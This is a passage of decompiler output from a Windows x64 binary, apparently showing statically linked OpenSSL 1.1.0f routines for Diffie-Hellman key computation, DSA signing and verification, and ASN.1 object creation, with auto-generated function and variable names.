  if ( !v5 )
  {
    v5 = sub_140027200();
    if ( !v5 )
      goto LABEL_21;
  }
  if ( (*(_BYTE *)(a1 + 48) & 1) != 0 )
  {
    v4 = sub_14003C690((__int64 *)(a1 + 56), *(_DWORD **)(a1 + 136), *(__int64 ***)(a1 + 8), v7);
    if ( !v4 )
      goto LABEL_21;
  }
  if ( v3 )
  {
    if ( *(_QWORD *)(a1 + 64) )
    {
      while ( (unsigned int)sub_140028310((__int64)v6, *(_QWORD *)(a1 + 64)) )
      {
        if ( !sub_140027160((__int64)v6) && !sub_140027110((__int64)v6) )
          goto LABEL_18;
      }
      goto LABEL_21;
    }
    v8 = *(_DWORD *)(a1 + 24);
    if ( !v8 )
      v8 = sub_140027260(*(_QWORD *)(a1 + 8)) - 1;
    if ( !(unsigned int)sub_1400282E0((__int64)v6, v8, 0, 0) )
    {
LABEL_21:
      sub_140024610(5, 103, 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_key.c", 134);
      goto LABEL_22;
    }
  }
LABEL_18:
  v9 = sub_140027200();
  v10 = v9;
  if ( !v9 )
    goto LABEL_21;
  sub_140027660((__int64)v9, (__int64)v6, 4);
  if ( !(*(unsigned int (__fastcall **)(__int64, _DWORD *, _QWORD, _DWORD *, _QWORD, int *, __int64))(*(_QWORD *)(a1 + 120) + 24i64))(
          a1,
          v5,
          *(_QWORD *)(a1 + 16),
          v10,
          *(_QWORD *)(a1 + 8),
          v7,
          v4) )
  {
    sub_140026FF0(v10);
    goto LABEL_21;
  }
  sub_140026FF0(v10);
  *(_QWORD *)(a1 + 32) = v5;
  v1 = 1;
  *(_QWORD *)(a1 + 40) = v6;
LABEL_22:
  if ( v5 != *(_DWORD **)(a1 + 32) )
    sub_140026FF0(v5);
  if ( v6 != *(_DWORD **)(a1 + 40) )
    sub_140026FF0(v6);
  sub_140027BE0((__int64)v7);
  return v1;
}

//----- (000000014004F960) ----------------------------------------------------
__int64 __fastcall sub_14004F960(_BYTE *a1, __int64 a2, __int64 a3)
{
  __int64 v6; // r14
  unsigned int v7; // esi
  int *v9; // rax
  int *v10; // rdi
  _QWORD *v11; // rbp
  int v12; // [rsp+80h] [rbp+18h] BYREF

  v6 = 0i64;
  v7 = -1;
  if ( (int)sub_140027260(*(_QWORD *)(a3 + 8)) <= 10000 )
  {
    v9 = (int *)sub_140027CD0();
    v10 = v9;
    if ( v9 )
    {
      sub_140027D40(v9);
      v11 = sub_140027C40(v10);
      if ( v11 )
      {
        if ( *(_QWORD *)(a3 + 40) )
        {
          if ( (*(_BYTE *)(a3 + 48) & 1) == 0
            || (v6 = sub_14003C690((__int64 *)(a3 + 56), *(_DWORD **)(a3 + 136), *(__int64 ***)(a3 + 8), v10),
                sub_140027530(*(_QWORD *)(a3 + 40), 4),
                v6) )
          {
            if ( !(unsigned int)sub_140081640(a3, a2, &v12) || v12 )
            {
              sub_140024610(5, 102, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_key.c", 179);
            }
            else if ( (*(unsigned int (__fastcall **)(__int64, _QWORD *, __int64, _QWORD, _QWORD, int *, __int64))(*(_QWORD *)(a3 + 120) + 24i64))(
                        a3,
                        v11,
                        a2,
                        *(_QWORD *)(a3 + 40),
                        *(_QWORD *)(a3 + 8),
                        v10,
                        v6) )
            {
              v7 = sub_1400269C0((__int64)v11, a1);
            }
            else
            {
              sub_140024610(5, 102, 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_key.c", 185);
            }
          }
        }
        else
        {
          sub_140024610(5, 102, 100, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_key.c", 166);
        }
      }
      sub_140027B60((__int64)v10);
      sub_140027BE0((__int64)v10);
    }
    return v7;
  }
  else
  {
    sub_140024610(5, 102, 103, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_key.c", 153);
    return 0xFFFFFFFFi64;
  }
}

//----- (000000014004FB10) ----------------------------------------------------
__int64 __fastcall sub_14004FB10(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        unsigned __int64 a5,
        int *a6,
        __int64 a7)
{
  return sub_14007BDF0(a2, a3, a4, a5, a6, a7);
}

//----- (000000014004FB60) ----------------------------------------------------
__int64 __fastcall sub_14004FB60(__int64 a1)
{
  *(_DWORD *)(a1 + 48) |= 1u;
  return 1i64;
}

//----- (000000014004FB70) ----------------------------------------------------
__int64 __fastcall sub_14004FB70(__int64 a1)
{
  sub_14003C3A0(*(_QWORD *)(a1 + 56));
  return 1i64;
}

//----- (000000014004FB90) ----------------------------------------------------
char **sub_14004FB90()
{
  return &off_1401355E0;
}
// 1401355E0: using guessed type char *off_1401355E0;

//----- (000000014004FBA0) ----------------------------------------------------
__int64 __fastcall sub_14004FBA0(__int64 a1, __int64 a2, __int64 a3)
{
  return (*(__int64 (**)(void))(*(_QWORD *)(a3 + 120) + 16i64))();
}

//----- (000000014004FBC0) ----------------------------------------------------
__int64 __fastcall sub_14004FBC0(char *a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax
  size_t v6; // rdi
  unsigned int v7; // esi
  int v8; // eax
  size_t v9; // rbx

  LODWORD(result) = (*(__int64 (**)(void))(*(_QWORD *)(a3 + 120) + 16i64))();
  v6 = (int)result;
  if ( (int)result <= 0 )
    return (unsigned int)result;
  v7 = (int)(sub_140027260(*(_QWORD *)(a3 + 8)) + 7) / 8;
  v8 = v7 - v6;
  if ( (int)(v7 - v6) > 0 )
  {
    v9 = v8;
    memmove(&a1[v8], a1, v6);
    memset(a1, 0, v9);
  }
  return v7;
}

//----- (000000014004FC60) ----------------------------------------------------
__int64 __fastcall sub_14004FC60(__int64 a1)
{
  return (*(__int64 (**)(void))(*(_QWORD *)(a1 + 120) + 8i64))();
}

//----- (000000014004FC80) ----------------------------------------------------
__int64 __fastcall sub_14004FC80()
{
  int v0; // eax

  return sub_1400417E0(&qword_140143378, v0 - 39);
}
// 14004FC8D: variable 'v0' is possibly undefined
// 14004FC80: using guessed type __int64 __fastcall sub_14004FC80();
// 140143378: using guessed type __int64 qword_140143378;

//----- (000000014004FCA0) ----------------------------------------------------
__int64 __fastcall sub_14004FCA0(__int64 a1)
{
  if ( *(_QWORD *)(a1 + 32) )
    return sub_140041620(&qword_140143378, (__int64)sub_14004FD40, a1, dword_1400F7BE0, 1, 0);
  else
    return 1i64;
}
// 1400F7BE0: using guessed type int dword_1400F7BE0[12];
// 140143378: using guessed type __int64 qword_140143378;

//----- (000000014004FCF0) ----------------------------------------------------
__int64 __fastcall sub_14004FCF0(__int64 a1)
{
  if ( *(_QWORD *)(a1 + 32) )
    return sub_140041620(&qword_140143378, (__int64)sub_14004FD40, a1, dword_1400F7BE0, 1, 1);
  else
    return 1i64;
}
// 1400F7BE0: using guessed type int dword_1400F7BE0[12];
// 140143378: using guessed type __int64 qword_140143378;

//----- (000000014004FD40) ----------------------------------------------------
__int64 sub_14004FD40()
{
  return sub_140041580(&qword_140143378);
}
// 140143378: using guessed type __int64 qword_140143378;

//----- (000000014004FD60) ----------------------------------------------------
void *sub_14004FD60()
{
  return &unk_1400F7C78;
}

//----- (000000014004FD70) ----------------------------------------------------
void __fastcall sub_14004FD70(__int64 a1)
{
  sub_140047500(a1);
}

//----- (000000014004FD90) ----------------------------------------------------
void *sub_14004FD90()
{
  return &unk_1400F7F58;
}

//----- (000000014004FDA0) ----------------------------------------------------
_DWORD *__fastcall sub_14004FDA0()
{
  int v0; // eax

  return sub_140047720(v0 - 37);
}
// 14004FDAD: variable 'v0' is possibly undefined

//----- (000000014004FDC0) ----------------------------------------------------
void *sub_14004FDC0()
{
  return &unk_1400F7D68;
}

//----- (000000014004FDD0) ----------------------------------------------------
void *sub_14004FDD0()
{
  return &unk_1400F7F28;
}

//----- (000000014004FDE0) ----------------------------------------------------
void *sub_14004FDE0()
{
  return &unk_1400F7DC8;
}

//----- (000000014004FDF0) ----------------------------------------------------
void *sub_14004FDF0()
{
  return &unk_1400F80A8;
}

//----- (000000014004FE00) ----------------------------------------------------
_DWORD *__fastcall sub_14004FE00()
{
  int v0; // eax

  return sub_140047720(v0 - 16);
}
// 14004FE0D: variable 'v0' is possibly undefined

//----- (000000014004FE20) ----------------------------------------------------
void *sub_14004FE20()
{
  return &unk_1400F8018;
}

//----- (000000014004FE30) ----------------------------------------------------
_DWORD *__fastcall sub_14004FE30()
{
  int v0; // eax

  return sub_140047720(v0 - 18);
}
// 14004FE3D: variable 'v0' is possibly undefined

//----- (000000014004FE50) ----------------------------------------------------
void *sub_14004FE50()
{
  return &unk_1400F7EF8;
}

//----- (000000014004FE60) ----------------------------------------------------
_DWORD *__fastcall sub_14004FE60()
{
  int v0; // eax

  return sub_140047720(v0 - 38);
}
// 14004FE6D: variable 'v0' is possibly undefined

//----- (000000014004FE80) ----------------------------------------------------
void *sub_14004FE80()
{
  return &unk_1400F7C18;
}

//----- (000000014004FE90) ----------------------------------------------------
__int64 sub_14004FE90()
{
  return sub_140050B70((__int64)&unk_1400F7C18);
}

//----- (000000014004FEB0) ----------------------------------------------------
void *sub_14004FEB0()
{
  return &unk_1400F7C48;
}

//----- (000000014004FEC0) ----------------------------------------------------
void *sub_14004FEC0()
{
  return &unk_1400F7DF8;
}

//----- (000000014004FED0) ----------------------------------------------------
void *sub_14004FED0()
{
  return &unk_1400F7EC8;
}

//----- (000000014004FEE0) ----------------------------------------------------
_DWORD *__fastcall sub_14004FEE0()
{
  int v0; // eax

  return sub_140047720(v0 - 36);
}
// 14004FEED: variable 'v0' is possibly undefined

//----- (000000014004FF00) ----------------------------------------------------
void *sub_14004FF00()
{
  return &unk_1400F7CD8;
}

//----- (000000014004FF10) ----------------------------------------------------
void *sub_14004FF10()
{
  return &unk_1400F7CA8;
}

//----- (000000014004FF20) ----------------------------------------------------
void __fastcall sub_14004FF20(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_1400F7C78);
}

//----- (000000014004FF40) ----------------------------------------------------
__int64 sub_14004FF40()
{
  return sub_140050B70((__int64)&unk_1400F7C78);
}

//----- (000000014004FF60) ----------------------------------------------------
_DWORD *__fastcall sub_14004FF60()
{
  int v0; // eax

  return sub_140047720(v0 - 17);
}
// 14004FF6D: variable 'v0' is possibly undefined

//----- (000000014004FF80) ----------------------------------------------------
void *sub_14004FF80()
{
  return &unk_1400F7F88;
}

//----- (000000014004FF90) ----------------------------------------------------
_DWORD *__fastcall sub_14004FF90()
{
  int v0; // eax

  return sub_140047720(v0 - 14);
}
// 14004FF9D: variable 'v0' is possibly undefined

//----- (000000014004FFB0) ----------------------------------------------------
void *sub_14004FFB0()
{
  return &unk_1400F7D38;
}

//----- (000000014004FFC0) ----------------------------------------------------
void *sub_14004FFC0()
{
  return &unk_1400F7D08;
}

//----- (000000014004FFD0) ----------------------------------------------------
__int64 __fastcall sub_14004FFD0(__int64 *a1, char **a2, __int64 a3)
{
  return sub_1400516D0(a1, a2, a3, (__int64)&unk_1400F7F28);
}

//----- (000000014004FFF0) ----------------------------------------------------
__int64 __fastcall sub_14004FFF0(__int64 *a1, char **a2, __int64 a3)
{
  return sub_1400516D0(a1, a2, a3, (__int64)&unk_1400F7EF8);
}

//----- (0000000140050010) ----------------------------------------------------
__int64 __fastcall sub_140050010(__int64 *a1, char **a2, __int64 a3)
{
  return sub_1400516D0(a1, a2, a3, (__int64)&unk_1400F7EC8);
}

//----- (0000000140050030) ----------------------------------------------------
__int64 __fastcall sub_140050030(__int64 *a1, char **a2, __int64 a3)
{
  return sub_1400516D0(a1, a2, a3, (__int64)&unk_1400F7C78);
}

//----- (0000000140050050) ----------------------------------------------------
__int64 __fastcall sub_140050050(unsigned int *a1, unsigned __int8 **a2)
{
  return sub_1400536F0(a1, a2, (__int64)&unk_1400F7EF8);
}

//----- (0000000140050070) ----------------------------------------------------
__int64 __fastcall sub_140050070(unsigned int *a1, unsigned __int8 **a2)
{
  return sub_1400536F0(a1, a2, (__int64)&unk_1400F7EC8);
}

//----- (0000000140050090) ----------------------------------------------------
__int64 __fastcall sub_140050090(unsigned int *a1, unsigned __int8 **a2)
{
  return sub_1400536F0(a1, a2, (__int64)&unk_1400F7E48);
}

//----- (00000001400500B0) ----------------------------------------------------
__int64 __fastcall sub_1400500B0(unsigned int *a1, unsigned __int8 **a2)
{
  return sub_1400536F0(a1, a2, (__int64)&unk_1400F7E98);
}

//----- (00000001400500D0) ----------------------------------------------------
__int64 __fastcall sub_1400500D0(unsigned int *a1, unsigned __int8 **a2)
{
  return sub_1400536F0(a1, a2, (__int64)&unk_1400F7C78);
}

//----- (00000001400500F0) ----------------------------------------------------
__int64 *__fastcall sub_1400500F0(char *a1, int a2, _QWORD *a3)
{
  __int16 v3; // ax
  __int16 v6; // r13
  int *v8; // rbp
  __int64 *v9; // rbx
  __int64 *v10; // r15
  __int64 *v11; // rax
  __int64 *v12; // r14
  _DWORD *v13; // rax
  int *v14; // rax
  __int64 *v16; // [rsp+78h] [rbp+20h] BYREF

  v16 = 0i64;
  v6 = v3 - 45;
  v8 = 0i64;
  v9 = 0i64;
  v10 = (__int64 *)sub_140027200();
  v11 = (__int64 *)sub_140027200();
  v12 = v11;
  if ( v10 && v11 )
  {
    if ( a3[1] && a3[2] && a3[3] )
    {
      v9 = (__int64 *)sub_14005E8B0();
      if ( v9 )
      {
        *v9 = (__int64)sub_140027200();
        v13 = sub_140027200();
        v9[1] = (__int64)v13;
        if ( *v9 )
        {
          if ( v13 )
          {
            v14 = (int *)sub_140027CD0();
            v8 = v14;
            if ( v14 )
            {
              if ( (unsigned int)sub_140050740((__int64)a3, v14, &v16, v9, a1, a2) )
              {
                do
                {
                  if ( a2 > (int)(sub_140027260(a3[2]) + 7) / 8 )
                    a2 = (int)(sub_140027260(a3[2]) + 7) / 8;
                  if ( !sub_140026840(a1, a2, (__int64)v10)
                    || !(unsigned int)sub_140079710((__int64)v12, a3[5], *v9, a3[2], v8)
                    || !(unsigned int)sub_140041A10(v9[1], (__int64)v12, (__int64)v10)
                    || (int)sub_140026AB0(v9[1], (__int64 *)a3[2]) > 0
                    && !(unsigned int)sub_140041AC0(v9[1], v9[1], a3[2])
                    || !(unsigned int)sub_140079710(v9[1], v9[1], (__int64)v16, a3[2], v8) )
                  {
                    break;
                  }
                  if ( !sub_140027160(*v9) && !sub_140027160(v9[1]) )
                    goto LABEL_25;
                }
                while ( (unsigned int)sub_140050740((__int64)a3, v8, &v16, v9, a1, a2) );
              }
            }
          }
        }
      }
    }
    else
    {
      v6 = 101;
    }
  }
  sub_140024610(10, 112, v6, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ossl.c", 116);
  sub_14005E840((__int64 **)v9);
  v9 = 0i64;
LABEL_25:
  sub_140027BE0((__int64)v8);
  sub_140026A10(v10);
  sub_140026A10(v12);
  sub_140026A10(v16);
  return v9;
}
// 140050123: variable 'v3' is possibly undefined

//----- (0000000140050350) ----------------------------------------------------
__int64 __fastcall sub_140050350(__int64 a1, int *a2, __int64 **a3, __int64 *a4)
{
  return sub_140050740(a1, a2, a3, a4, 0i64, 0);
}

//----- (0000000140050380) ----------------------------------------------------
__int64 __fastcall sub_140050380(_BYTE *a1, int a2, __int64 *a3, __int64 a4)
{
  __int64 v4; // r12
  unsigned int v5; // edi
  __int64 v7; // rcx
  int v8; // r13d
  __int64 *v10; // rbp
  _DWORD *v11; // r14
  _DWORD *v12; // r15
  int *v13; // rax
  int *v14; // rsi
  int v15; // eax
  int v16; // r13d
  __int64 **v17; // rax
  __int64 (__fastcall *v18)(__int64, _DWORD *, _QWORD, __int64 *, _QWORD, _DWORD *, __int64 **, int *, __int64); // r10
  int v19; // eax
  __int64 *v20; // [rsp+50h] [rbp-58h] BYREF
  __int64 *v24; // [rsp+C8h] [rbp+20h] BYREF

  v4 = 0i64;
  v5 = -1;
  if ( *(_QWORD *)(a4 + 8) )
  {
    v7 = *(_QWORD *)(a4 + 16);
    if ( v7 )
    {
      if ( *(_QWORD *)(a4 + 24) )
      {
        v8 = sub_140027260(v7);
        if ( ((v8 - 160) & 0xFFFFFF9F) != 0 || v8 == 192 )
        {
          sub_140024610(10, 113, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ossl.c", 239);
          return v5;
        }
        if ( (int)sub_140027260(*(_QWORD *)(a4 + 8)) > 10000 )
        {
          sub_140024610(10, 113, 103, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ossl.c", 244);
          return v5;
        }
        v10 = (__int64 *)sub_140027200();
        v11 = sub_140027200();
        v12 = sub_140027200();
        v13 = (int *)sub_140027CD0();
        v14 = v13;
        if ( !v10 || !v11 || !v12 || !v13 )
          goto LABEL_33;
        sub_14005E890(a3, (__int64 *)&v24, &v20);
        if ( sub_140027160((__int64)v24)
          || sub_1400270E0((__int64)v24)
          || (int)sub_140027600(v24, *(__int64 **)(a4 + 16)) >= 0
          || sub_140027160((__int64)v20)
          || sub_1400270E0((__int64)v20)
          || (int)sub_140027600(v20, *(__int64 **)(a4 + 16)) >= 0 )
        {
          v5 = 0;
          goto LABEL_34;
        }
        if ( !sub_14006FDD0(v11, (__int64)v20, *(__int64 **)(a4 + 16), v14) )
          goto LABEL_33;
        v15 = a2;
        v16 = v8 >> 3;
        if ( a2 > v16 )
          v15 = v16;
        if ( sub_140026840(a1, v15, (__int64)v10)
          && (unsigned int)sub_140079710((__int64)v10, (__int64)v10, (__int64)v11, *(_QWORD *)(a4 + 16), v14)
          && (unsigned int)sub_140079710((__int64)v11, (__int64)v24, (__int64)v11, *(_QWORD *)(a4 + 16), v14)
          && ((*(_BYTE *)(a4 + 48) & 1) == 0
           || (v4 = sub_14003C690((__int64 *)(a4 + 56), *(_DWORD **)(a4 + 96), *(__int64 ***)(a4 + 8), v14)) != 0)
          && ((v17 = *(__int64 ***)(a4 + 8),
               (v18 = *(__int64 (__fastcall **)(__int64, _DWORD *, _QWORD, __int64 *, _QWORD, _DWORD *, __int64 **, int *, __int64))(*(_QWORD *)(a4 + 80) + 32i64)) == 0i64)
            ? (v19 = sub_140081760(
                       (__int64)v12,
                       *(_QWORD *)(a4 + 24),
                       (__int64)v10,
                       *(_QWORD *)(a4 + 32),
                       (__int64)v11,
                       v17,
                       v14,
                       v4))
            : (v19 = v18(a4, v12, *(_QWORD *)(a4 + 24), v10, *(_QWORD *)(a4 + 32), v11, v17, v14, v4)),
              v19 && (unsigned int)sub_140041D70(0i64, (__int64)v10, (__int64)v12, *(_QWORD *)(a4 + 16), v14)) )
        {
          v5 = sub_140027600(v10, v24) == 0;
        }
        else
        {
LABEL_33:
          sub_140024610(10, 113, 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ossl.c", 320);
        }
LABEL_34:
        sub_140027BE0((__int64)v14);
        sub_140026FF0(v10);
        sub_140026FF0(v11);
        sub_140026FF0(v12);
        return v5;
      }
    }
  }
  sub_140024610(10, 113, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ossl.c", 232);
  return 0xFFFFFFFFi64;
}

//----- (0000000140050730) ----------------------------------------------------
char **sub_140050730()
{
  return &off_140135630;
}
// 140135630: using guessed type char *off_140135630;

//----- (0000000140050740) ----------------------------------------------------
__int64 __fastcall sub_140050740(__int64 a1, int *a2, __int64 **a3, __int64 *a4, char *a5, int a6)
{
  __int64 v6; // r12
  int *v7; // rbp
  unsigned int v10; // r13d
  __int64 *v11; // rsi
  __int64 v13; // rdx
  int v15; // ebx
  __int64 (__fastcall *v16)(__int64, __int64, _QWORD, __int64 *, _QWORD, int *, _QWORD); // r10
  __int64 *v18; // rbx

  v6 = *a4;
  v7 = 0i64;
  v10 = 0;
  if ( *(_QWORD *)(a1 + 8) && *(_QWORD *)(a1 + 16) && *(_QWORD *)(a1 + 24) )
  {
    v11 = (__int64 *)sub_140027200();
    if ( v11 )
    {
      if ( a2 )
      {
        v7 = a2;
LABEL_12:
        while ( 1 )
        {
          v13 = *(_QWORD *)(a1 + 16);
          if ( !(a5
               ? sub_140028040((__int64)v11, v13, *(_QWORD *)(a1 + 40), a5, a6, v7)
               : (unsigned int)sub_140028310((__int64)v11, v13)) )
            break;
          if ( !sub_140027160((__int64)v11) )
          {
            sub_140027530((__int64)v11, 4);
            if ( (*(_BYTE *)(a1 + 48) & 1) == 0
              || sub_14003C690((__int64 *)(a1 + 56), *(_DWORD **)(a1 + 96), *(__int64 ***)(a1 + 8), v7) )
            {
              if ( (unsigned int)sub_140041A10((__int64)v11, (__int64)v11, *(_QWORD *)(a1 + 16)) )
              {
                v15 = sub_140027260((__int64)v11);
                if ( v15 > (int)sub_140027260(*(_QWORD *)(a1 + 16))
                  || (unsigned int)sub_140041A10((__int64)v11, (__int64)v11, *(_QWORD *)(a1 + 16)) )
                {
                  v16 = *(__int64 (__fastcall **)(__int64, __int64, _QWORD, __int64 *, _QWORD, int *, _QWORD))(*(_QWORD *)(a1 + 80) + 40i64);
                  if ( v16
                     ? v16(a1, v6, *(_QWORD *)(a1 + 24), v11, *(_QWORD *)(a1 + 8), v7, *(_QWORD *)(a1 + 56))
                     : (unsigned int)sub_14007BDF0(
                                       v6,
                                       *(_QWORD *)(a1 + 24),
                                       (__int64)v11,
                                       *(_QWORD *)(a1 + 8),
                                       v7,
                                       *(_QWORD *)(a1 + 56)) )
                  {
                    if ( (unsigned int)sub_140041D70(0i64, v6, v6, *(_QWORD *)(a1 + 16), v7) )
                    {
                      v18 = (__int64 *)sub_14006FDD0(0i64, (__int64)v11, *(__int64 **)(a1 + 16), v7);
                      if ( v18 )
                      {
                        sub_140026A10(*a3);
                        *a3 = v18;
                        v10 = 1;
                        goto LABEL_8;
                      }
                    }
                  }
                }
              }
            }
            break;
          }
        }
      }
      else
      {
        v7 = (int *)sub_140027CD0();
        if ( v7 )
          goto LABEL_12;
      }
    }
    sub_140024610(10, 107, 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ossl.c", 216);
LABEL_8:
    if ( v7 != a2 )
      sub_140027BE0((__int64)v7);
    sub_140026A10(v11);
    return v10;
  }
  else
  {
    sub_140024610(10, 107, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ossl.c", 142);
    return 0i64;
  }
}

//----- (00000001400509C0) ----------------------------------------------------
__int64 __fastcall sub_1400509C0()
{
  int v0; // eax

  return sub_1400417E0(&qword_140143380, v0 - 39);
}
// 1400509CD: variable 'v0' is possibly undefined
// 1400509C0: using guessed type __int64 __fastcall sub_1400509C0();
// 140143380: using guessed type __int64 qword_140143380;

//----- (00000001400509E0) ----------------------------------------------------
__int64 __fastcall sub_1400509E0(__int64 a1)
{
  if ( *(_QWORD *)(a1 + 24) )
    return sub_140041620(&qword_140143380, (__int64)sub_140050A80, a1, &dword_1400F8354, 1, 0);
  else
    return 1i64;
}
// 1400F8354: using guessed type int dword_1400F8354;
// 140143380: using guessed type __int64 qword_140143380;

//----- (0000000140050A30) ----------------------------------------------------
__int64 __fastcall sub_140050A30(__int64 a1)
{
  if ( *(_QWORD *)(a1 + 24) )
    return sub_140041620(&qword_140143380, (__int64)sub_140050A80, a1, &dword_1400F8354, 1, 1);
  else
    return 1i64;
}
// 1400F8354: using guessed type int dword_1400F8354;
// 140143380: using guessed type __int64 qword_140143380;

//----- (0000000140050A80) ----------------------------------------------------
__int64 sub_140050A80()
{
  return sub_140041580(&qword_140143380);
}
// 140143380: using guessed type __int64 qword_140143380;

//----- (0000000140050AA0) ----------------------------------------------------
__int64 __fastcall sub_140050AA0(__int64 a1, unsigned int *a2)
{
  unsigned int v3; // eax
  __int64 v5; // rbx
  char *v6; // [rsp+48h] [rbp+10h] BYREF
  char *v7; // [rsp+50h] [rbp+18h] BYREF

  v6 = 0i64;
  if ( !a2 )
    return 0i64;
  v3 = sub_1400536F0(a2, (unsigned __int8 **)&v6, a1);
  if ( !v6 )
  {
    sub_140024610(13, 191, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_dup.c", 61);
    return 0i64;
  }
  v7 = v6;
  v5 = sub_1400516D0(0i64, &v7, v3, a1);
  sub_14001D930(v6);
  return v5;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140050B50) ----------------------------------------------------
__int64 __fastcall sub_140050B50(__int64 *a1, __int64 a2)
{
  return sub_140050C80(a1, a2, 0);
}

//----- (0000000140050B70) ----------------------------------------------------
__int64 __fastcall sub_140050B70(__int64 a1)
{
  __int64 v1; // rbx
  __int64 v3; // [rsp+38h] [rbp+10h] BYREF

  v1 = 0i64;
  v3 = 0i64;
  if ( (int)sub_140050C80(&v3, a1, 0) > 0 )
    return v3;
  return v1;
}

//----- (0000000140050BB0) ----------------------------------------------------
void __fastcall sub_140050BB0(_DWORD *a1, char *a2)
{
  unsigned int v2; // eax
  __int64 v4; // rax
  __int64 v5; // rax
  void (__fastcall *v6)(_DWORD *); // r8

  v2 = *a2;
  while ( 2 )
  {
    switch ( v2 )
    {
      case 0u:
        v4 = *((_QWORD *)a2 + 1);
        if ( !v4 )
          goto LABEL_10;
        if ( (*(_DWORD *)v4 & 0x306) != 0 )
          goto LABEL_11;
        a2 = (char *)(*(__int64 (**)(void))(v4 + 24))();
        v2 = *a2;
        if ( v2 <= 6 )
          continue;
        break;
      case 1u:
      case 2u:
      case 6u:
        goto LABEL_11;
      case 4u:
        v5 = *((_QWORD *)a2 + 3);
        if ( v5 && (v6 = *(void (__fastcall **)(_DWORD *))(v5 + 24)) != 0i64 )
          v6(a1);
        else
LABEL_11:
          *(_QWORD *)a1 = 0i64;
        break;
      case 5u:
LABEL_10:
        sub_140050F30(a1, (__int64)a2);
        break;
      default:
        return;
    }
    break;
  }
}

//----- (0000000140050C80) ----------------------------------------------------
__int64 __fastcall sub_140050C80(__int64 *a1, __int64 a2, int a3)
{
  int v4; // esi
  __int64 v5; // rdx
  unsigned int (__fastcall *v8)(__int64, __int64 *, __int64); // r14
  __int64 (__fastcall *v9)(__int64 *, __int64); // rax
  int v10; // eax
  int *v11; // rdx
  __int64 v12; // rdx
  int v14; // eax
  void *v15; // rax
  int v16; // eax
  void *v17; // rax
  int *v18; // rbp
  __int64 *v19; // rax

  v4 = 0;
  v5 = *(_QWORD *)(a2 + 24);
  if ( !v5 || (v8 = *(unsigned int (__fastcall **)(__int64, __int64 *, __int64))(v5 + 24)) == 0i64 )
    v8 = 0i64;
  switch ( *(_BYTE *)a2 )
  {
    case 0:
      v11 = *(int **)(a2 + 8);
      if ( v11 )
      {
        v10 = sub_140051110(a1, v11);
        goto LABEL_12;
      }
      v12 = a2;
      goto LABEL_11;
    case 1:
    case 6:
      if ( !v8 )
        goto LABEL_27;
      v16 = ((__int64 (__fastcall *)(_QWORD, __int64 *, __int64, _QWORD))v8)(0i64, a1, a2, 0i64);
      if ( !v16 )
        goto LABEL_37;
      if ( v16 == 2 )
        return 1i64;
LABEL_27:
      if ( a3 )
      {
        memset((void *)*a1, 0, *(int *)(a2 + 32));
      }
      else
      {
        v17 = sub_14001DC20(*(int *)(a2 + 32));
        *a1 = (__int64)v17;
        if ( !v17 )
          goto LABEL_39;
      }
      if ( (int)sub_140081F50(a1, 0, a2) < 0 )
        goto LABEL_38;
      sub_1400820A0(a1, a2);
      v18 = *(int **)(a2 + 8);
      if ( *(int *)(a2 + 16) <= 0 )
        goto LABEL_34;
      break;
    case 2:
      if ( !v8 )
        goto LABEL_18;
      v14 = ((__int64 (__fastcall *)(_QWORD, __int64 *, __int64, _QWORD))v8)(0i64, a1, a2, 0i64);
      if ( !v14 )
        goto LABEL_37;
      if ( v14 == 2 )
        return 1i64;
LABEL_18:
      if ( a3 )
      {
        memset((void *)*a1, 0, *(int *)(a2 + 32));
      }
      else
      {
        v15 = sub_14001DC20(*(int *)(a2 + 32));
        *a1 = (__int64)v15;
        if ( !v15 )
          goto LABEL_39;
      }
      sub_140082270(a1, -1, a2);
      if ( !v8 || v8(1i64, a1, a2) )
        return 1i64;
      goto LABEL_36;
    case 4:
      if ( !v5 )
        return 1i64;
      v9 = *(__int64 (__fastcall **)(__int64 *, __int64))(v5 + 8);
      if ( !v9 )
        return 1i64;
      v10 = v9(a1, a2);
LABEL_12:
      if ( v10 )
        return 1i64;
      goto LABEL_39;
    case 5:
      v12 = a2;
LABEL_11:
      v10 = sub_140050F80((_DWORD **)a1, v12, a3);
      goto LABEL_12;
    default:
      return 1i64;
  }
  do
  {
    v19 = (__int64 *)sub_140082260(a1, (__int64)v18);
    if ( !(unsigned int)sub_140051110(v19, v18) )
    {
LABEL_38:
      sub_140051230((unsigned int **)a1, a2);
LABEL_39:
      sub_140024610(13, 121, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_new.c", 147);
      return 0i64;
    }
    v18 += 8;
    ++v4;
  }
  while ( v4 < *(_DWORD *)(a2 + 16) );
LABEL_34:
  if ( !v8 || v8(1i64, a1, a2) )
    return 1i64;
LABEL_36:
  sub_140051230((unsigned int **)a1, a2);
LABEL_37:
  sub_140024610(13, 121, 100, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_new.c", 156);
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140050F30) ----------------------------------------------------
void __fastcall sub_140050F30(_DWORD *a1, __int64 a2)
{
  __int64 v2; // rax
  void (*v3)(void); // r8

  if ( a2 )
  {
    v2 = *(_QWORD *)(a2 + 24);
    if ( v2 )
    {
      v3 = *(void (**)(void))(v2 + 32);
      if ( v3 )
